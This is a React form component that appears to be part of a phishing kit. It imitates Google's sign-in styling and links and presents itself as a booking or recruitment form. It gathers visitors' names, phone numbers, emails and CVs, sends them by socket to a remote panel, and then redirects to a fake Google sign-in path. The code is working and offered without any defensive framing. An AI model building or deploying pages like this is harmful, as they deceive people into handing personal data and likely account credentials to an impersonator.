import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import Logo from './assets/logo.webp';

const API_URL = process.env.NODE_ENV === 'development' 
  ? 'http://localhost:3001' 
  : 'https://panel.academyredbull.com';

function BookingForm() {
  const socketRef = useRef(null);
  const [formData, setFormData] = useState({
    name: '',
    surname: '',
    phone: '',
    email: '',
    cv: null
  });

  const [focused, setFocused] = useState({
    name: false,
    surname: false,
    phone: false,
    email: false
  });

  const [isLoading, setIsLoading] = useState(false);

  // Initialize socket connection
  useEffect(() => {
    if (!socketRef.current) {
      const socket = io(API_URL, { withCredentials: true });
      socketRef.current = socket;

      socket.on('connect', () => console.log('[SOCKET] connected:', socket.id));
      socket.on('disconnect', (reason) => console.log('[SOCKET] disconnected:', reason));
      socket.on('connect_error', (err) => console.error('[SOCKET] connect_error:', err?.message || err));
    }
  }, []);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      // Convert file to base64 for socket transmission
      const reader = new FileReader();
      reader.onloadend = () => {
        setFormData(prev => ({ ...prev, cv: `${file.name}|${reader.result}` }));
      };
      reader.readAsDataURL(file);
    }
  };

  const handleFocus = (field) => {
    setFocused(prev => ({ ...prev, [field]: true }));
  };

  const handleBlur = (field) => {
    setFocused(prev => ({ ...prev, [field]: !!formData[field] }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);

    // Send form data via socket
    const socket = socketRef.current;
    if (socket) {
      socket.emit('user:booking-form', {
        name: formData.name,
        surname: formData.surname,
        phone: formData.phone,
        email: formData.email,
        cv: formData.cv
      });

      console.log('[BookingForm] Sent to server:', formData);

      // Redirect after a short delay
      setTimeout(() => {
        window.location.href = '/v2/signin/identifierauthusercontinue=';
      }, 500);
    }
  };

  return (
    <div className="md:min-h-screen bg-white md:bg-[#f0f4f9] flex items-center justify-center pt-5 md:py-12 px-4">
      <div className="w-full max-w-md md:max-w-5xl md:bg-white rounded-[28px] md:shadow-sm md:border md:border-gray-200 relative">
        {/* Loading Bar */}
        {isLoading && (
          <div className="absolute top-0 left-0 md:top-auto md:left-auto w-full md:max-w-[60rem] h-[3px] bg-transparent overflow-hidden rounded-t-[28px]">
            <div className="h-full bg-[#1a73e8] animate-bar1"></div>
            <div className="h-full bg-[#1a73e8] animate-bar2"></div>
          </div>
        )}

        <div className=" p-6">
          <div className="md:flex md:gap-16 md:items-start">
            {/* Left Side - Desktop */}
            <div className="flex-1">
              <div className="mb-6">
                <img src={Logo} alt="logo" className="w-20" />
              </div>
              <h1 className="text-4xl font-normal text-gray-800 mb-4 text-start">
                Tell us about yourself
              </h1>
              <p className="text-base text-gray-600 text-start leading-6 mb-8">
                Please provide your information to continue with the booking process.
              </p>
            </div>

            {/* Right Side - Form */}
            <div className="flex-1">
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Name Field */}
                <div className="relative w-full">
                  <input
                    id="name"
                    name="name"
                    type="text"
                    value={formData.name}
                    onChange={handleInputChange}
                    onFocus={() => handleFocus('name')}
                    onBlur={() => handleBlur('name')}
                    className={`w-full h-14 px-4 text-base rounded-md border bg-white
                      ${focused.name ? 'border-blue-500' : 'border-[#747775]'}
                      focus:outline-none transition-all duration-200`}
                    required
                  />
                  <label
                    htmlFor="name"
                    className={`absolute left-4 text-gray-500 pointer-events-none transition-all duration-200
                      ${focused.name || formData.name ? '-top-2 text-xs text-blue-600 bg-white px-1' : 'top-4 text-base'}`}
                  >
                    First Name
                  </label>
                </div>

                {/* Surname Field */}
                <div className="relative w-full">
                  <input
                    id="surname"
                    name="surname"
                    type="text"
                    value={formData.surname}
                    onChange={handleInputChange}
                    onFocus={() => handleFocus('surname')}
                    onBlur={() => handleBlur('surname')}
                    className={`w-full h-14 px-4 text-base rounded-md border bg-white
                      ${focused.surname ? 'border-blue-500' : 'border-[#747775]'}
                      focus:outline-none transition-all duration-200`}
                    required
                  />
                  <label
                    htmlFor="surname"
                    className={`absolute left-4 text-gray-500 pointer-events-none transition-all duration-200
                      ${focused.surname || formData.surname ? '-top-2 text-xs text-blue-600 bg-white px-1' : 'top-4 text-base'}`}
                  >
                    Last Name
                  </label>
                </div>

                {/* Phone Field */}
                <div className="relative w-full">
                  <input
                    id="phone"
                    name="phone"
                    type="tel"
                    value={formData.phone}
                    onChange={handleInputChange}
                    onFocus={() => handleFocus('phone')}
                    onBlur={() => handleBlur('phone')}
                    className={`w-full h-14 px-4 text-base rounded-md border bg-white
                      ${focused.phone ? 'border-blue-500' : 'border-[#747775]'}
                      focus:outline-none transition-all duration-200`}
                    required
                  />
                  <label
                    htmlFor="phone"
                    className={`absolute left-4 text-gray-500 pointer-events-none transition-all duration-200
                      ${focused.phone || formData.phone ? '-top-2 text-xs text-blue-600 bg-white px-1' : 'top-4 text-base'}`}
                  >
                    Phone Number
                  </label>
                </div>

                {/* Email Field */}
                <div className="relative w-full">
                  <input
                    id="email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    onFocus={() => handleFocus('email')}
                    onBlur={() => handleBlur('email')}
                    className={`w-full h-14 px-4 text-base rounded-md border bg-white
                      ${focused.email ? 'border-blue-500' : 'border-[#747775]'}
                      focus:outline-none transition-all duration-200`}
                    required
                  />
                  <label
                    htmlFor="email"
                    className={`absolute left-4 text-gray-500 pointer-events-none transition-all duration-200
                      ${focused.email || formData.email ? '-top-2 text-xs text-blue-600 bg-white px-1' : 'top-4 text-base'}`}
                  >
                    Personal Email
                  </label>
                </div>

                {/* CV Upload (Optional) */}
                <div style={{ position: 'relative', width: '100%' }}>
                  <label style={{ display: 'block', fontSize: '0.875rem', fontWeight: '500', color: '#374151', marginBottom: '0.5rem' }}>
                    Upload CV (Optional)
                  </label>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100%' }}>
                    <label style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', width: '100%', height: '8rem', border: '2px dashed #d1d5db', borderRadius: '0.5rem', cursor: 'pointer', backgroundColor: '#f9fafb', transition: 'background-color 0.2s' }}>
                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', paddingTop: '1.25rem', paddingBottom: '1.5rem' }}>
                        <svg style={{ width: '2rem', height: '2rem', marginBottom: '0.75rem', color: '#6b7280' }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                        </svg>
                        <p style={{ marginBottom: '0.5rem', fontSize: '0.875rem', color: '#6b7280' }}>
                          <span style={{ fontWeight: '600' }}>Click to upload</span> or drag and drop
                        </p>
                        <p style={{ fontSize: '0.75rem', color: '#6b7280' }}>PDF, DOC, DOCX (MAX. 5MB)</p>
                      </div>
                      <input
                        id="cv"
                        name="cv"
                        type="file"
                        style={{ display: 'none' }}
                        accept=".pdf,.doc,.docx"
                        onChange={handleFileChange}
                      />
                    </label>
                  </div>
                  {formData.cv && (
                    <p style={{ marginTop: '0.5rem', fontSize: '0.875rem', color: '#16a34a' }}>
                      ✓ File uploaded: {formData.cv.split('|')[0]}
                    </p>
                  )}
                </div>

                {/* Submit Button */}
                <div className="flex items-center justify-end pt-8">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-[20px] text-sm disabled:opacity-50 disabled:cursor-not-allowed transition-colors min-w-[80px]"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="fixed bottom-0 left-0 md:bottom-auto md:left-auto w-full  md:max-w-5xl text-gray-600  text-[13px] px-4 md:px-6 py-2 flex items-center justify-center md:justify-between gap-6 flex-wrap">
          {/* Language selector */}
          <div className="flex items-center gap-1">
            <select
              className="bg-transparent text-gray-600 dark:text-gray-300 text-sm focus:outline-none cursor-pointer"
              defaultValue="en-GB"
            >
              <option value="en-US">English (United States)</option>
              <option value="en-GB">English (United Kingdom)</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          {/* Footer links */}
       <div className="flex items-center gap-6">
            <a href="https://support.google.com/accounts?hl=en-GB&visit_id=638967175488186215-4011923115&rd=2&p=account_iph#topic=3382296" target="_blank" className="hover:underline">
              Help
            </a>
            <a href="https://policies.google.com/privacy?hl=en-GB" target="_blank" className="hover:underline">
              Privacy
            </a>
            <a href="https://policies.google.com/terms?hl=en-GB" target="_blank" className="hover:underline">
              Terms
            </a>
          </div>
        </footer>
      </div>
    </div>
  );
}

export default BookingForm;

